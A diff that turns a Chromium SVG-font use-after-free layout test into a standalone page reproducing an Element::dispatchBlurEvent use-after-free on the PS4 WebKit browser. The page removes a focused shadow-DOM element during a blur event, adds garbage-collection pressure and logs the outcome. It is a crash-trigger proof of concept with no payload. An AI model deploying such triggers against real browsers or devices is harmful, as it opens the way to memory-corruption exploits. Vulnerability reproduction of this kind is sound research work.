@@ -1,56 +1,404 @@
-<html xmlns="http://www.w3.org/1999/xhtml" xlink="http://www.w3.org/1999/xlink">
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS4 WebKit - Element dispatchBlurEvent UAF</title>
+
+<style>
+body {
+    font-family: monospace;
+    background: #111;
+    color: #ddd;
+    padding: 16px;
+}
+
+#result {
+    white-space: pre-wrap;
+    border: 1px solid #555;
+    padding: 12px;
+    min-height: 300px;
+}
+
+.pass {
+    color: #8f8;
+}
+
+.warn {
+    color: #ffb84d;
+}
+
+.fail {
+    color: #f66;
+}
+</style>
+
+</head>
+
 <body>
-<svg version="1.1" xlink="http://www.w3.org/1999/xlink" width="100%" xmlns="http://www.w3.org/2000/svg">
-    <g>
-        <defs>
-            <font horiz-adv-x="224" id="embeded">
-                <font-face font-family="embeded" id="fontWillBeRemoved"></font-face>
-                <glyph horiz-adv-x="1500" unicode="1"></glyph>
-                <glyph horiz-adv-x="1500" unicode="2"></glyph>
-                <glyph horiz-adv-x="1500" unicode="3"></glyph>
-                <glyph horiz-adv-x="1500" unicode="4"></glyph>
-                <glyph horiz-adv-x="1500" unicode="fi"></glyph>
-            </font>
-        </defs>
-        <g>
-            <use id="use"></use>
-            <text font-family="embeded" id="text">fi1234</text>
-        </g>
-    </g>
-</svg>
-</body>
+
+<h3>PS4 WebKit - dispatchBlurEvent UAF test</h3>
+
+<div id="host"></div>
+
+<div id="result"></div>
+
 <script>
-// crbug.com/352178: Heap-use-after-free in WebCore::SVGFontFaceElement::associatedFontElement.
-// PASS if no crash occurs.
+
+"use strict";
+
+var logLines = [];
+var result = document.getElementById("result");
+
+function log(message) {
+    logLines.push(message);
+    result.textContent = logLines.join("\n");
+}
+
 function gc() {
     function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
+        if (n < 1)
+            return {};
+
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+
+        gcRec(n - 1);
     }
+
     for (var i = 0; i < 10000; i++)
-    gcRec(10);
+        gcRec(10);
 }
 
 
-document.execCommand("SelectAll");
+/*
+ * ---------------------------------------------------------
+ * Initial state
+ * ---------------------------------------------------------
+ */
+
+log("========================================");
+log("PS4 WebKit UAF reproduction");
+log("Element::dispatchBlurEvent");
+log("========================================");
+
+log("");
+log("[1] Creating Shadow DOM...");
+
+var shadowRoot = host.attachShadow({
+    mode: "open"
+});
+
+var victim = document.createElement("div");
+
+victim.tabIndex = 0;
+victim.textContent = "Focusable";
+
+shadowRoot.appendChild(victim);
+
+log("[+] ShadowRoot created");
+log("[+] Victim appended");
+log("[+] victim.tabIndex = 0");
+
+
+/*
+ * ---------------------------------------------------------
+ * Focus victim
+ * ---------------------------------------------------------
+ */
+
+log("");
+log("[2] Focusing victim...");
+
+victim.focus();
+
+log("[+] victim.focus() called");
+log("[+] document.activeElement = " +
+    (document.activeElement ?
+        document.activeElement.tagName :
+        "null"));
+
+log("[+] shadowRoot.activeElement = " +
+    (shadowRoot.activeElement ?
+        shadowRoot.activeElement.tagName :
+        "null"));
+
+
+/*
+ * ---------------------------------------------------------
+ * Blur handler
+ *
+ * This is the important part of the original test.
+ *
+ * The listener is installed during the capture phase because
+ * blur does not bubble.
+ * ---------------------------------------------------------
+ */
+
+var blurTriggered = false;
+var victimRemoved = false;
+var gcTriggered = false;
+
+document.addEventListener("blur", function(event) {
+
+    log("");
+    log("========================================");
+    log("[!] DOCUMENT BLUR EVENT");
+    log("========================================");
+
+    blurTriggered = true;
+
+    log("[+] blur event captured");
+
+    log("[+] event.target = " +
+        (event.target ?
+            event.target.tagName :
+            "null"));
+
+    log("[+] victim exists = " + (!!victim));
+
+    /*
+     * Preserve the object long enough to perform the
+     * DOM removal, then discard the JavaScript reference.
+     */
+    var currentVictim = victim;
+
+    if (currentVictim) {
+
+        log("[3] Removing victim from ShadowRoot...");
+
+        currentVictim.remove();
+
+        victimRemoved = true;
+
+        log("[+] victim.remove() completed");
+
+        log("[+] victim.isConnected = " +
+            currentVictim.isConnected);
+
+        /*
+         * Drop the JS reference.
+         *
+         * The original LayoutTest subsequently invokes
+         * GCController.collect().
+         */
+        victim = null;
+
+        log("[+] JavaScript victim reference cleared");
+
+        log("");
+        log("[4] Running JavaScript GC pressure...");
+
+        gc();
+
+        gcTriggered = true;
+
+        log("[+] gc() completed");
+    }
+
+}, true);
+
+
+/*
+ * ---------------------------------------------------------
+ * Window focus/blur listeners
+ * ---------------------------------------------------------
+ */
+
+window.addEventListener("blur", function() {
+
+    log("");
+    log("[+] window 'blur' event observed");
+
+}, false);
+
+window.addEventListener("focus", function() {
+
+    log("");
+    log("[+] window 'focus' event observed");
+
+}, false);
+
+
+/*
+ * ---------------------------------------------------------
+ * Test execution
+ * ---------------------------------------------------------
+ */
+
+function finish() {
+
+    log("");
+    log("========================================");
+    log("RESULT");
+    log("========================================");
+
+    log("document blur captured : " + blurTriggered);
+    log("victim removed         : " + victimRemoved);
+    log("gc pressure executed   : " + gcTriggered);
+
+    if (blurTriggered && victimRemoved) {
+
+        log("");
+        log("[PASS] Critical blur/removal sequence executed.");
+        log("[INFO] Browser did not crash during this attempt.");
+
+    } else {
+
+        log("");
+        log("[WARN] Original critical sequence was not fully reached.");
+        log("[INFO] This may indicate that window.blur() did not");
+        log("       produce the PS4 page-focus transition.");
+    }
+
+    log("");
+    log("Test finished.");
+}
+
 
 function runTest() {
-    setTimeout(function() {
-        var fontWillBeRemoved = document.getElementById("fontWillBeRemoved");
-        var use = document.getElementById("use");
-        var text = document.getElementById("text");
 
-        fontWillBeRemoved.parentNode.removeChild(fontWillBeRemoved);
-        delete fontWillBeRemoved; 
-        fontWillBeRemoved = null;
-	gc();
-        use.appendChild(text);
-    }, 0);
+    log("");
+    log("[5] Starting PS4 focus transition attempt...");
+
+    /*
+     * This replaces:
+     *
+     *     await UIHelper.setWindowIsKey(false);
+     *
+     * UIHelper is a WebKit LayoutTest/TestRunner API and is
+     * unavailable to ordinary PS4 web content.
+     *
+     * window.blur() is therefore the closest web-exposed
+     * approximation available here.
+     */
+
+    try {
+
+        log("[+] Calling window.blur()...");
+
+        window.blur();
+
+        log("[+] window.blur() returned");
+
+    } catch (e) {
+
+        log("[!] window.blur() exception: " + e);
+
+    }
+
+
+    /*
+     * Give the browser a chance to process the focus transition.
+     */
+    setTimeout(function() {
+
+        log("");
+        log("[6] Checking focus state...");
+
+        log("[+] document.hasFocus() = " +
+            document.hasFocus());
+
+        log("[+] document.activeElement = " +
+            (document.activeElement ?
+                document.activeElement.tagName :
+                "null"));
+
+
+        /*
+         * If the window blur path did not generate the expected
+         * sequence, perform a controlled second focus transition.
+         *
+         * This does NOT recreate UIHelper.setWindowIsKey(false);
+         * it simply gives the PS4 browser another ordinary DOM
+         * focus transition to process.
+         */
+
+        if (!blurTriggered) {
+
+            log("");
+            log("[7] First path did not trigger document blur.");
+            log("[+] Performing secondary focus transition...");
+
+            var temporary = document.createElement("button");
+
+            temporary.textContent = "temporary";
+            temporary.style.position = "absolute";
+            temporary.style.left = "-10000px";
+            temporary.style.top = "-10000px";
+
+            document.body.appendChild(temporary);
+
+            log("[+] Temporary focus target created");
+
+            try {
+
+                temporary.focus();
+
+                log("[+] temporary.focus() called");
+
+            } catch (e) {
+
+                log("[!] temporary.focus() exception: " + e);
+
+            }
+
+            setTimeout(function() {
+
+                try {
+
+                    log("[+] Calling window.blur() again...");
+
+                    window.blur();
+
+                } catch (e) {
+
+                    log("[!] second window.blur() exception: " + e);
+
+                }
+
+                setTimeout(function() {
+
+                    try {
+                        temporary.remove();
+                        log("[+] Temporary target removed");
+                    } catch (e) {
+                        log("[!] Temporary removal exception: " + e);
+                    }
+
+                    finish();
+
+                }, 100);
+
+            }, 50);
+
+        } else {
+
+            finish();
+
+        }
+
+    }, 250);
 }
 
-document.addEventListener("DOMContentLoaded", runTest, false);
+
+/*
+ * ---------------------------------------------------------
+ * Start after initial focus has settled.
+ * ---------------------------------------------------------
+ */
+
+setTimeout(function() {
+
+    log("");
+    log("[+] Initial focus stabilization complete.");
+    log("[+] Beginning reproduction...");
+    
+    runTest();
+
+}, 100);
+
 </script>
+
+</body>
 </html>
